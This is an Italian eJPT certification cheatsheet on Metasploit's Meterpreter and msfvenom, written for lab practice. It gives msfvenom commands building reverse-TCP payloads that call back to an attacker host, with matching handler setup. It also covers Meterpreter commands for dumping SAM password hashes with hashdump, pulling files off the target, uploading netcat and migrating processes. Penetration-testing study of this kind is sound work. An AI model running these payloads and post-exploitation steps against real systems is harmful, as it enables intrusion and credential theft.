---
layout: cheatsheet
cert: ejpt
cert_label: "eJPT"
title: "Meterpreter e Msfvenom"
permalink: "/cheatsheet/ejpt/07-metasploit-framework/04-meterpreter-msfvenom/"
section: "Metasploit Framework"
section_order: 7
order: 4
sort_key: 704
---

**Difficoltà:** Intermediate
**Time to Master:** 2.5h
**Prerequisiti:** [03-Exploit-Modules.md](/cheatsheet/ejpt/07-metasploit-framework/03-exploit-modules/)
**Lab:** INE PTS, Meterpreter labs

---

## Obiettivo

Una sessione meterpreter aperta e lasciata lì, senza saperci navigare dentro, vale poco più di un accesso che potresti perdere al primo riavvio del processo. Qui impari a operare in modo efficace dentro la sessione, e a generare payload standalone con msfvenom per gli scenari dove non esiste un exploit diretto — un file malevolo da consegnare, un comando da eseguire su un servizio già compromesso in altro modo.

---

## Concetti chiave

### Meterpreter vs shell semplice

Meterpreter e un payload avanzato che gira interamente in memoria, offre comandi strutturati (non solo una shell testuale), supporta migrazione tra processi, e cifra la comunicazione con il framework: molto più robusto di una reverse shell netcat.

### Migrazione di processo

Il processo in cui gira meterpreter può terminare — per esempio se è nato da un exploit su un servizio che si riavvia da solo — e con lui la sessione. `migrate` sposta la sessione in un processo più stabile/appropriato (es. `explorer.exe` su Windows) senza perdere l'accesso: è uno dei comandi che ti salva da un accesso perso per una banalità.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| meterpreter | comandi interni (sysinfo, ps, migrate...) | vedi Esempi | disponibile solo dentro una sessione aperta |
| msfvenom | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=.. LPORT=.. -f exe -o shell.exe` | payload standalone | combina payload + encoder + formato output |
| exploit/multi/handler | `set payload ...; set LHOST ..; set LPORT ..; run` | listener per il payload generato | va lanciato PRIMA di eseguire il payload sul target |

---

## Payload / Esempi

### Esempio 1: comandi meterpreter essenziali

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > migrate 1234
meterpreter > hashdump
meterpreter > shell
```

**Output atteso:**
```
Computer        : PC01
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Meterpreter     : x64/windows
Server username : NT AUTHORITY\SYSTEM
```

**Spiegazione:** `sysinfo`/`getuid` orientano subito su OS e privilegio corrente; `hashdump` estrae gli hash locali SAM (richiede privilegio SYSTEM/admin): collegato a [../05-System-Host-Attacks/04-Credential-Dumping-Mimikatz.md](/cheatsheet/ejpt/05-system-host-attacks/04-credential-dumping-mimikatz/).

### Esempio 2: download/upload file

```
meterpreter > download C:\\Users\\admin\\Desktop\\flag.txt /tmp/flag.txt
meterpreter > upload /tmp/nc.exe C:\\Windows\\Temp\\nc.exe
```

**Spiegazione:** utile sia per estrarre evidenze/flag sia per portare tool aggiuntivi sul target compromesso.

### Esempio 3: generazione payload standalone con msfvenom e listener

```bash
# generazione payload Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe

# generazione payload Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf -o shell.elf
```

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.2
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

**Output atteso:**
```
[*] Started reverse TCP handler on 10.10.14.2:4444
[*] Sending stage (200262 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened
```

**Spiegazione:** il payload/porta scelti in msfvenom devono corrispondere ESATTAMENTE a quelli impostati nell'handler, altrimenti la connessione di ritorno non trova nessuno in ascolto. `-f` controlla il formato di output (exe, elf, raw, php, asp, ecc.) in base al target.

---

## Lab Hands-On

### Lab 1: INE PTS, Meterpreter e generazione payload
**Obiettivo:** generare un payload standalone, avviare un handler, ottenere ed esplorare una sessione
**Difficulty:** Media
**Time:** 1h

**Walkthrough breve:**
1. Genera un payload con msfvenom per l'OS target
2. Avvia `exploit/multi/handler` con parametri corrispondenti
3. Trasferisci/esegui il payload sul target (in lab, tramite share/servizio disponibile)
4. Esplora la sessione con sysinfo/getuid/ps/hashdump

---

## Common Mistakes

- LPORT/payload diversi tra msfvenom e handler -> nessuna sessione si apre, nessun errore esplicito
- Non fare `migrate` prima che il processo host termini -> sessione persa
- Usare `hashdump` senza privilegi sufficienti -> errore access denied, serve prima privesc

---

## Link Utili

- [Msfvenom Cheat Sheet: Rapid7](https://www.offsec.com/metasploit-unleashed/msfvenom/)

---

## Connessioni

- **Prerequisito:** [03-Exploit-Modules.md](/cheatsheet/ejpt/07-metasploit-framework/03-exploit-modules/)
- **Prossimo Step:** [Lab-Challenges.md](/cheatsheet/ejpt/07-metasploit-framework/lab-challenges/)
- **Combinazione con:** [../08-Exploitation-PostEx/02-Reverse-Bind-Shells.md](/cheatsheet/ejpt/08-exploitation-postex/02-reverse-bind-shells/)

---

## Checklist di padronanza

- [ ] So usare i comandi meterpreter essenziali (sysinfo, getuid, ps, migrate, hashdump)
- [ ] So generare un payload con msfvenom per Windows e Linux
- [ ] So configurare correttamente un handler corrispondente al payload
- [ ] So trasferire file dentro/fuori da una sessione meterpreter
